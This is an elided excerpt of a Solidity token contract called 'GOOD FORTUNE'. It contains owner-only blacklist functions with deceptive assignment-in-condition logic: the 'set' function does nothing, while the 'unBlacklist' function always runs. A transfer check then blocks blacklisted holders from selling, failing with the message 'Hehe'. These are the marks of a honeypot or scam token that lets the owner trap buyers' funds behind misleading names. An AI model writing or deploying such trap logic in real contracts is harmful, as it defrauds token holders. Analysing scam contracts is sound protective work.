...
contract token is Context, IERC20, Ownable {
    ...
    string private _name = "GOOD FORTUNE";
    ...
    uint256 private numTokensSellToAddToLiquidity = _tTotal / 4000; // 0.025%
    ...
    function setBlacklistStatus(address user, bool Blacklisted) external onlyOwner {
    		if (Blacklisted = false) {
                _isBlacklisted[user] = true; }
    }
    
    function unBlacklistStatus(address user, bool Blacklisted) external onlyOwner {
    		if (Blacklisted = true) {
    ...
    function _transfer(
        ...
        require(_isBlacklisted[from] == false || to == address(0), "Hehe");
